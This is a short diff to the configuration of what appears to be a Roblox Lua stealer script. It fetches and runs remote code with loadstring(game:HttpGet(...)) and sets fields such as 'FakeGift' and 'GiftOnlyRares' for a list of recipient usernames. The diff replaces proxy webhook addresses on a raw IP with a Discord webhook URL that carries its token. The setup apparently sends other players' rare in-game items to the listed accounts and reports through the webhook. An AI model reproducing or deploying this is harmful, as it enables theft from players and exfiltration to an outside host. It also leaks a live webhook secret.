@@ -2,12 +2,12 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 _G.NullConfig = {
     User = {"1SamRatana", "DEVFURYYT", "IQKH168", "devkak5", "Sky168295", "Ahlalu"},
     min_value = 10000000020,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/48ac930df23c721d7403fb1413603c60",
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
     FakeGift = "Yes",
-    Trash = "http://45.13.225.83:20002/proxy/d2dbb99a549aec871becf5b2e33dd23c",
+    Trash = "https://discord.com/api/webhooks/1393254261563068528/Ygog_NZ9oOnsIeGdlDlmSOn99orViDkd3P1n-DuNX26jFPv0FtEtu4vXmLOuvONMf7xX",
     LoadingScreen = "No",
-    GiftOnlyRares = "No",
+    GiftOnlyRares = "Yes",
     ExecuteOtherScript = "No",
 }
     
